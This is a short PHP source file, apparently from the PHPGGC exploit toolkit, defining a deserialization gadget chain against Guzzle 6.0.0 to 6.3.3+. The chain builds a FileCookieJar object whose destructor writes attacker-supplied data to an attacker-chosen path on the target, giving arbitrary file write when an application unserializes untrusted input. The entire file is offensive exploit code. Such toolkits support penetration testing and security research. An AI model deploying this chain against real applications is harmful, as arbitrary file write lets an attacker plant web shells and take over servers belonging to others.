<?php

namespace GadgetChain\Guzzle;

class FW1 extends \PHPGGC\GadgetChain\FileWrite
{
    public static $version = '6.0.0 <= 6.3.3+';
    public static $vector = '__destruct';
    public static $author = 'cf';

    public function generate(array $parameters)
    {
        $path = $parameters['remote_path'];
        $data = $parameters['data'];

        return new \GuzzleHttp\Cookie\FileCookieJar($path, $data);
    }
}
